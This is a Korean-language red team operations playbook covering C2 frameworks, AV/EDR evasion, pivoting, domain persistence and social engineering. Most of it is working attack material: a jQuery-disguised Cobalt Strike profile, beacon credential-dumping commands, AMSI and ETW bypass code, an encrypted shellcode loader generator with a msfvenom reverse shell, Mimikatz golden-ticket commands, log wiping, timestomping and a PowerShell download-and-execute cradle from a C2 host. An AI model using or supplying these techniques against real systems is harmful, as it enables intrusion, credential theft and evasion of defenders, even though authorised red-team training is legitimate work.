# 레드팀 운영 플레이북

## 레드팀 vs 펜테스트

```
침투 테스트 (Pentest)          레드팀 (Red Team)
─────────────────────────────────────────────────
범위: 특정 시스템/앱              범위: 전체 조직
시간: 수 일~수 주                시간: 수 주~수 개월
목표: 취약점 발견                목표: 탐지 우회 + 목표 달성
알림: 보안팀 대부분 인지         알림: 극소수만 인지 (화이트셀)
메트릭: 취약점 수                메트릭: 목표 달성 여부
팀: 보안팀 협력                  팀: 독립 작전
```

---

## 1. 레드팀 운영 구조

### 팀 구성

```
레드팀 리더 (Red Team Lead)
  │
  ├── 기술 운영자 (Operator)
  │     - 초기 접근/익스플로잇
  │     - 내부 이동
  │     
  ├── C2 운영자 (C2 Operator)
  │     - Cobalt Strike/Havoc 서버 운영
  │     - 비콘 관리
  │
  └── 인텔리전스 분석가
        - OSINT
        - 타겟 프로파일링
        - 사회공학 계획

화이트셀 (White Cell):
  - 규칙 통제
  - 비상 정지 권한
  - 블루팀 중재
```

### 운영 단계

```
1. 계획 (Planning)
   - 목표(Flag) 정의
   - 규칙(Rules of Engagement) 수립
   - OSINT 정찰

2. 초기 접근 (Initial Access)
   - 피싱 캠페인
   - 공개 취약점 익스플로잇
   - 물리적 접근

3. 실행 (Execution)
   - 페이로드 실행
   - 프로세스 인젝션

4. 지속성 (Persistence)
   - 자동 시작 메커니즘
   - 계정 생성

5. 권한 상승 (Privilege Escalation)
   - 로컬 → 도메인 관리자

6. 방어 우회 (Defense Evasion)
   - AV/EDR 우회
   - 로그 삭제

7. 자격증명 접근 (Credential Access)
   - Mimikatz
   - Kerberoasting

8. 발견 (Discovery)
   - 내부 네트워크 매핑
   - 민감 데이터 탐색

9. 수집 (Collection)
   - 데이터 압축
   - 스테이징

10. 목표 달성 (Impact/Exfiltration)
    - 데이터 유출
    - 비즈니스 시스템 접근
```

---

## 2. Cobalt Strike 핵심 운영

### 팀 서버 설정

```bash
# Cobalt Strike 팀 서버 시작
./teamserver SERVER_IP STRONG_PASSWORD malleable_profile.c2

# 클라이언트 연결
./cobaltstrike
# → 팀 서버 IP 및 비밀번호 입력

# Malleable C2 프로필 (탐지 우회)
# GET 요청처럼 보이는 C2 트래픽
```

### Malleable C2 프로필 작성

```
# jquery.c2 - jQuery처럼 위장
http-get {
    set uri "/jquery-3.3.1.min.js";
    
    client {
        header "Host" "cdn.jquery.com";
        header "Accept" "text/javascript";
        header "Referer" "https://www.google.com/";
        
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "text/javascript; charset=utf-8";
        header "Cache-Control" "max-age=3600";
        header "Server" "cloudflare";
        
        output {
            print;
        }
    }
}

http-post {
    set uri "/jquery-3.3.1.min.js";
    
    client {
        header "Host" "cdn.jquery.com";
        header "Content-Type" "application/javascript";
        
        id {
            base64url;
            append ".min.js";
            uri-append;
        }
        
        output {
            base64url;
            print;
        }
    }
    
    server {
        header "Content-Type" "text/javascript";
        output { print; }
    }
}

# 비콘 슬리프 설정 (탐지 회피)
set sleeptime "60000";      # 60초 기본 슬리프
set jitter "20";             # 20% 랜덤 지터
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
```

### Cobalt Strike 핵심 명령어

```bash
# 비콘 관리
beacon> help                    # 도움말
beacon> sleep 0                 # 즉시 응답 (적극적)
beacon> sleep 300 20            # 5분 슬리프 + 20% 지터 (은밀)

# 정찰
beacon> whoami                  # 현재 사용자
beacon> getuid                  # 현재 유저 ID
beacon> ps                      # 프로세스 목록
beacon> net computers           # 도메인 컴퓨터
beacon> net localgroup          # 로컬 그룹
beacon> net user /domain        # 도메인 사용자

# 자격증명
beacon> logonpasswords          # Mimikatz logonpasswords
beacon> dcsync DOMAIN\ACCOUNT   # DC Sync (관리자)
beacon> kerberos_ticket_use /tmp/ticket.kirbi  # 티켓 사용

# 수평 이동
beacon> jump psexec TARGET LISTENER
beacon> jump winrm TARGET LISTENER
beacon> remote-exec wmi TARGET cmd /c whoami

# 권한 상승
beacon> getsystem              # 로컬 권한 상승 시도
beacon> runasadmin             # UAC 우회

# 데이터 수집
beacon> download C:\sensitive\file.txt
beacon> screenshot              # 스크린샷
beacon> keylogger               # 키로거
beacon> browserpivot PID        # 브라우저 피벗

# 피벗
beacon> socks 1080              # SOCKS4 프록시
beacon> socks5 1080 socks_user pass  # SOCKS5
beacon> covertvpn               # VPN 피벗
```

---

## 3. Havoc C2 프레임워크 (오픈소스)

```bash
# Havoc 설치
git clone https://github.com/HavocFramework/Havoc
cd Havoc
make ts-build   # 팀 서버 빌드
make client-build  # 클라이언트 빌드

# 팀 서버 시작
./havoc server --profile ./profiles/havoc.yaotl

# YAOTL 프로필 예시
Teamserver {
    Host = "0.0.0.0"
    Port = 40056
    Build {
        Compiler64 = "x86_64-w64-mingw32-gcc"
    }
}

Operators {
    operator "operator1" {
        Password = "StrongPass123!"
    }
}

Listeners {
    Http {
        Name = "https80"
        Hosts = ["attacker.com"]
        Port = 443
        Ssl = true
        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        Uris = ["/jquery.min.js", "/bootstrap.css"]
    }
}
```

---

## 4. AV/EDR 우회 기법

### AMSI (Anti-Malware Scan Interface) 우회

```powershell
# AMSI 패치 (Reflection 기반)
$a=[Ref].Assembly.GetTypes()
foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static')
foreach($e in $d){if($e.Name -like "*Context"){$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# AMSI 우회 - 오류 강제 발생
[Runtime.InteropServices.Marshal]::WriteByte(
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
        'amsiInitFailed','NonPublic,Static').GetValue($null), 1
)
```

### ETW (Event Tracing for Windows) 우회

```csharp
// ETW 비활성화 (프로세스 내)
using System.Runtime.InteropServices;

[DllImport("ntdll.dll")]
static extern int NtSetInformationProcess(
    IntPtr ProcessHandle, 
    int ProcessInformationClass,
    ref int ProcessInformation, 
    int ProcessInformationLength);

// ETW 비활성화
int flag = 0;
NtSetInformationProcess(
    (IntPtr)(-1),   // 현재 프로세스
    0x1D,           // ProcessDisableUserModeCallbackFilter
    ref flag, 
    sizeof(int));
```

### 프로세스 인젝션 기법

```csharp
// 고전적: VirtualAllocEx + WriteProcessMemory
// → 탐지됨

// 개선: Process Hollowing
// 1. 정상 프로세스 Suspend 상태로 생성
// 2. 메모리 언맵핑
// 3. 악성 코드 맵핑
// 4. Resume

// 더 개선: Thread Hijacking (현존 스레드 활용)
// 1. OpenThread
// 2. SuspendThread
// 3. GetThreadContext
// 4. VirtualAllocEx + Write shellcode
// 5. SetThreadContext (RIP/EIP 변경)
// 6. ResumeThread

// 최신: Direct Syscall (API 훅킹 우회)
// NTDLL 훅을 피해 직접 syscall 번호 호출
```

### Shellcode 난독화

```python
#!/usr/bin/env python3
"""Shellcode 암호화 및 로더 생성"""

import os
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_shellcode(shellcode: bytes) -> tuple:
    """AES-256-CBC로 Shellcode 암호화"""
    key = os.urandom(32)
    iv = os.urandom(16)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(shellcode, 16))
    
    return key, iv, encrypted

def generate_csharp_loader(key: bytes, iv: bytes, shellcode: bytes) -> str:
    """C# 로더 코드 생성"""
    
    key_hex = ', '.join([f'0x{b:02x}' for b in key])
    iv_hex = ', '.join([f'0x{b:02x}' for b in iv])
    sc_hex = ', '.join([f'0x{b:02x}' for b in shellcode])
    
    template = f"""
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Loader {{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, 
        IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    static void Main() {{
        byte[] key = {{ {key_hex} }};
        byte[] iv = {{ {iv_hex} }};
        byte[] encryptedShellcode = {{ {sc_hex} }};
        
        // 복호화
        using (Aes aes = Aes.Create()) {{
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            
            using (var decryptor = aes.CreateDecryptor()) {{
                byte[] shellcode = decryptor.TransformFinalBlock(
                    encryptedShellcode, 0, encryptedShellcode.Length);
                
                // 메모리 할당 및 실행
                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                    0x3000, 0x40);  // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
                
                Marshal.Copy(shellcode, 0, addr, shellcode.Length);
                
                IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, 
                    IntPtr.Zero, 0, IntPtr.Zero);
                
                WaitForSingleObject(thread, 0xFFFFFFFF);
            }}
        }}
    }}
}}
"""
    return template

# msfvenom으로 shellcode 생성 후 암호화
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f raw -o shellcode.bin
```

---

## 5. 내부 네트워크 피벗

### SOCKS 프록시를 통한 피벗

```bash
# chisel로 SOCKS 터널
# 공격자 서버
./chisel server -p 8080 --reverse

# 피해자 시스템
./chisel client ATTACKER_IP:8080 R:socks

# proxychains 설정
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 내부 네트워크 도구 사용
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains python3 secretsdump.py domain/user@internal_dc

# SSH 동적 포트 포워딩
ssh -D 1080 -N user@pivot_host

# Ligolo-ng (고성능 피벗)
# 서버 (공격자)
./proxy -selfcert
# 에이전트 (피해자)
./agent -connect ATTACKER_IP:11601 -ignore-cert
# 인터페이스 생성
>> tunnel_start --tun ligolo
```

### 더블 피벗 (두 단계 중간 시스템)

```bash
# 인터넷 → 에지 서버 → 내부 서버 → 격리 서버
# 공격자 → Pivot1 → Pivot2 → Target

# 1단계: Pivot1 접근
ssh user@EDGE_SERVER

# 2단계: Pivot1에서 Pivot2로 터널
# Pivot1에서:
ssh -L 2222:INTERNAL_SERVER:22 -N user@INTERNAL_SERVER &
ssh -D 1080 -N -p 2222 user@127.0.0.1

# 공격자에서:
proxychains nmap -sT INTERNAL_NETWORK/24
```

---

## 6. 도메인 지속성

### Golden Ticket

```bash
# 1. krbtgt 해시 획득
mimikatz# lsadump::dcsync /user:krbtgt /domain:company.local
# → NTLM Hash: aabbcc...

# 2. Golden Ticket 생성
mimikatz# kerberos::golden \
    /domain:company.local \
    /sid:S-1-5-21-XXXXXXXXXX \
    /krbtgt:KRBTGT_NTLM_HASH \
    /user:Administrator \
    /groups:512,513,518,519,520 \
    /ticket:golden.kirbi

# 3. 티켓 사용
mimikatz# kerberos::ptt golden.kirbi

# 또는 Pass-the-Ticket
Rubeus.exe ptt /ticket:golden.kirbi

# Golden Ticket으로 도메인 내 모든 서비스 접근
klist  # 티켓 확인
dir \\DC01\C$  # DC 파일 시스템 접근
```

### Diamond Ticket (탐지 우회 개선)

```bash
# Rubeus Diamond Ticket 생성 (합법적 TGT + 수정)
Rubeus.exe diamond \
    /tgtdeleg \
    /ticketuser:user@company.com \
    /ticketuserid:1234 \
    /groups:512 \
    /krbkey:AES256_KEY \
    /nowrap
```

---

## 7. MITRE ATT&CK 프레임워크 매핑

### ATT&CK 매트릭스 개요
```
전술 (Tactic) → 기법 (Technique) → 절차 (Procedure)

주요 전술 14개:
  TA0043 Reconnaissance      → 정찰
  TA0042 Resource Development → 자원 개발
  TA0001 Initial Access       → 초기 접근
  TA0002 Execution            → 실행
  TA0003 Persistence          → 지속성
  TA0004 Privilege Escalation → 권한 상승
  TA0005 Defense Evasion      → 방어 우회
  TA0006 Credential Access    → 자격증명 접근
  TA0007 Discovery            → 발견
  TA0008 Lateral Movement     → 측면 이동
  TA0009 Collection           → 수집
  TA0011 Command and Control  → C2
  TA0010 Exfiltration         → 유출
  TA0040 Impact               → 영향
```

### 레드팀 작전과 ATT&CK 매핑 예시
```
초기 접근 (T1566 Phishing)
  └─→ 실행 (T1059 Command and Script Interpreter)
        └─→ 지속성 (T1053 Scheduled Task/Job)
              └─→ 권한 상승 (T1055 Process Injection)
                    └─→ 자격증명 접근 (T1003 OS Credential Dumping)
                          └─→ 측면 이동 (T1550 Pass the Hash)
                                └─→ 유출 (T1048 Exfiltration Over Alternative Protocol)
```

### 주요 기법별 탐지 회피 전략
```bash
# T1059.001 PowerShell 탐지 우회
# AMSI 우회 + ETW 비활성화 후 실행
powershell -w hidden -ep bypass -enc <BASE64>

# T1003.001 LSASS 덤프 탐지 우회
# 직접 LSASS 접근 대신 VSS 활용
# 또는 MiniDumpWriteDump API 대신 NtReadVirtualMemory 직접 호출

# T1070.001 이벤트 로그 삭제 탐지
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
# 단, 로그 삭제 자체가 이벤트 ID 1102로 기록됨 → 주의

# T1027 난독화
# 인코딩, 암호화, 패킹 등으로 정적 분석 우회
```

---

## 8. 레드팀 보고서 구조

```markdown
# 레드팀 최종 보고서

## 이사회 요약 (Executive Summary)
- 작전 기간: 2024-01-15 ~ 2024-02-15
- 목표 달성: 3/5개 (60%)
- 탐지 회피: 블루팀이 14일 동안 미탐지
- 핵심 위험: 피싱 → 도메인 장악 체인

## 목표 달성 현황
| 목표 | 결과 | 소요 시간 |
|------|------|----------|
| 도메인 관리자 획득 | ✓ 달성 | 3일 |
| 재무 시스템 접근 | ✓ 달성 | 7일 |
| 고객 DB 접근 | ✓ 달성 | 10일 |
| 물리적 서버실 접근 | ✗ 미달성 | - |
| 임원 이메일 접근 | ✓ 달성 | 12일 |

## 공격 체인 (Attack Chain)
초기 접근 → 권한 상승 → 내부 이동 → 목표 달성

## 주요 발견 사항
### Critical
1. 피싱 인식 부재 (클릭률 43%)
2. EDR 커버리지 갭 (3개 서버 미설치)
3. 크리덴셜 재사용 (AD 사용자의 68%)

## 블루팀 탐지 현황
- 14일간 미탐지
- 최초 탐지: 1월 29일 (EDR 알림)
- 탐지 계기: 비정상적 LSASS 접근

## 개선 권고사항
Priority 1 (즉시):
  - 피싱 훈련 강화
  - EDR 전 시스템 배포
  - 특권 계정 MFA 적용

Priority 2 (30일 내):
  - Tier 모델 (관리자/일반 분리)
  - Privileged Access Workstation
  - 네트워크 분리 강화
```

---

## 9. 물리적 레드팀 기법

### 사회공학 (Social Engineering)
```
스피어 피싱 캠페인 준비:
  1. OSINT로 표적 직원 프로파일링
     - LinkedIn, 회사 홈페이지, SNS
  2. 신뢰할 수 있는 발신자 위장
     - 동료, 협력사, IT 팀
  3. 상황에 맞는 미끼 (Lure) 제작
     - 인사 발령, 급여명세서, 청구서
  4. 페이로드 포함 문서 또는 링크
     - 매크로 포함 Word/Excel
     - HTML Smuggling
     - ISO/ZIP 파일 (MOTW 우회)

Vishing (전화 사기):
  - IT 지원팀 위장 비밀번호 요청
  - 긴급 상황 연출 (심리적 압박)

Baiting (미끼):
  - USB 드롭 공격 (주차장, 로비)
  - 악성 USB에 자동실행 페이로드
```

### 물리적 접근
```
건물 침투 방법:
  1. Tailgating — 직원 뒤에 따라 들어가기
  2. 택배기사/수리기사 위장
  3. 잠금 픽킹 (Lock Picking)
  4. 리더기 클로닝 (RFID/NFC 카드)

내부 접근 후:
  - RJ45 탭 또는 Wi-Fi 펌프킨으로 트래픽 캡처
  - USB Rubber Ducky로 빠른 페이로드 실행
  - LAN Turtle — 인라인 네트워크 임플란트
```

---

## 10. 레드팀 운영 보안 (OPSEC)

### 인프라 구성
```
레드팀 인프라 (레이어드 구조):

인터넷
  │
  ├── 리다이렉터 (Redirector)
  │     - 클라우드 VPS (AWS/Azure/GCP)
  │     - 실제 C2 IP 숨김
  │     - Apache/Nginx mod_rewrite
  │
  └── C2 서버 (팀 서버)
        - VPN으로만 접속
        - 공개 IP 없음
        - 로그 암호화 보관
```

### 도메인 프론팅 및 CDN 악용
```bash
# CloudFront 도메인 프론팅 (현재 대부분 차단됨)
# 대안: CDN 제공사의 합법적 도메인 뒤에 C2 숨기기

# 합법적으로 보이는 도메인 등록
# - typosquatting: micosoft.com, googgle.com
# - 카테고리화 우선: news, sports, cdn 관련 도메인
# - 오래된 도메인 구매 (Domain Age 우선)

# 도메인 신뢰도 확인
curl "https://www.virustotal.com/vtapi/v2/domain/report?domain=DOMAIN&apikey=API_KEY"
```

### 흔적 최소화
```bash
# 타임스탬프 조작
touch -t 202001010000 malicious.exe    # 타임스탬프 변경
touch -r legit.dll malicious.dll       # 합법 파일의 타임스탬프 복사

# 메모리에서만 실행 (파일리스 공격)
# PowerShell IEX (다운로드 및 메모리 실행)
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"

# 로그 삭제 (탐지 위험 있음)
# Windows
wevtutil cl Security
# Linux
> /var/log/auth.log    # 파일 내용 비우기 (삭제보다 덜 눈에 띔)
```
